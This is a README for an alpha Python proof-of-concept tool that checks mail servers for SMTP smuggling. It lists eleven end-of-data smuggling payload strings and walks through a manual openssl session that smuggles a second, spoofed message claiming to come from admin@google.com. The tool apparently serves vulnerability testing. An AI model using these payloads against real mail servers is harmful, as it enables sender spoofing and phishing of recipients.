# smtp_smuggling_checker.py
### smtp smuggling testing tool with tls / starttls support

### Infos:
https://www.postfix.org/smtp-smuggling.html

and here:

https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/

### Beware this is alpha POC !! tested with postfix and python3

#### Testing of postfix mailserver for example (localhost port 25 auth plain login(optinal)):
![grafik](https://github.com/suuhm/smtp_smuggling_checker.py/assets/11504990/f46c47ed-8cd7-4395-9d2e-12589a505e21)


#### Testing these 11 payload strings:
```bash
#Smgggling Strings (0-10):
#smtp_smuggle_escape = '\r\n.\r'
#smtp_smuggle_escape = '\r\n\x00.\r'
#smtp_smuggle_escape = '\r\n\x00.\n'
#smtp_smuggle_escape = \r\n\x00.\r\n
#smtp_smuggle_escape = \r\n.\x00\r\n
#smtp_smuggle_escape = '\r\n.'
#smtp_smuggle_escape = \n.\r\n
#smtp_smuggle_escape = \r.\r\n
#smtp_smuggle_escape = \n\n.\r\n
#smtp_smuggle_escape = \r\n.\r
#smtp_smuggle_escape = \n.\n
```

### How to use:

```python
usage: smtp_smuggle.py [-h] [--server SERVER] [--port PORT] [--user USER]
                       [--rcpt RCPT] [--mode MODE]

Send mail with TLS und AUTH PLAIN.

optional arguments:
  -h, --help       show this help message and exit
  --server SERVER  SMTP-Servername
  --port PORT      SMTP-Serverport
  --user USER      SMTP-userername
  --rcpt RCPT      rcpt address
  --mode MODE      Rawmode = raw or Default = def?
```

### Run like this:

```python
.\smtp_smuggling_checker.py --server mail.server.com --port 587 --user user@server.com --rcpt vic@server.com --mode def
```

### Using telnet / openssl client for TLS

```bash
# Get base64 auth String:
# echo -n -e "\000info@myserver.com\000MYPASSWORD" | base64

openssl s_client -starttls smtp -crlf -connect mail.myserver.com:587 -tls1_2

AUTH PLAIN <YOU_BASE_64_STRING>

mail From: info@myserver.com

rcpt To: test@google.de

DATA
354 End data with <CR><LF>.<CR><LF>
From: test <it@google.de>
To: bla <jadu@foo.de>
Subject: Test1
bodyy Test1
<CR><LF>.<CR>
mail From: admin@google.com
rcpt To: jadu@foo.de
data
From: hallo admin <it@google.de>
To: gege <jadu@aniwe.de>
Subject: hallooooo
bodyyhacked
<CR><LF>.<CR><LF>
```

